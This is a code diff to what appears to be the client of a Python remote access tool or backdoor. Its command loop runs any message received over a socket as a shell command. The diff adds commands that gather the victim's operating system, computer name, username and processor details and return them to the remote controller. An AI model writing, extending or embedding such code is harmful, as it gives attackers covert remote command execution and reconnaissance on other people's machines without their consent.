@@ -8,6 +8,7 @@ import subprocess
 import multiprocessing
 import os
 import platform
+import getpass
 
 # ------CONSTANTS-------
 HEADERSIZE = 10
@@ -58,8 +59,26 @@ def recv_commands():
                     except:
                         pass
                 if len(full_msg) > 0:
-                    if "getos" == full_msg:
+                    if "getos" in full_msg:
                         output_bytes = bytes(str(platform.system() + "\n"), "utf-8")
+                    elif "info" in full_msg and platform.system() == "Windows":
+                        sysinfo = f"""
+                                       Operating System: {platform.system()}
+                                       Computer Name: {platform.node()}
+                                       Username: {getpass.getuser()}
+                                       Release Version: {platform.release()}
+                                       Processor Architecture: {platform.processor()}
+                                                   \n"""
+                        output_bytes = bytes(str(sysinfo), "utf-8")
+                    elif "information" in full_msg and platform.system() != "Windows":
+                        sysinfo = f"""
+                                                           Operating System: {platform.system()}
+                                                           Computer Name: {platform.node()}
+                                                           Username: {getpass.getuser()}
+                                                           Release Version: {platform.release()}
+                                                           Processor Architecture: {platform.processor()}
+                                                                       \n"""
+                        output_bytes = bytes(str(sysinfo), "utf-8")
                     else:
                         cmd = subprocess.Popen(full_msg[:], shell=True, stdout=subprocess.PIPE,
                                                stderr=subprocess.PIPE, stdin=subprocess.PIPE)
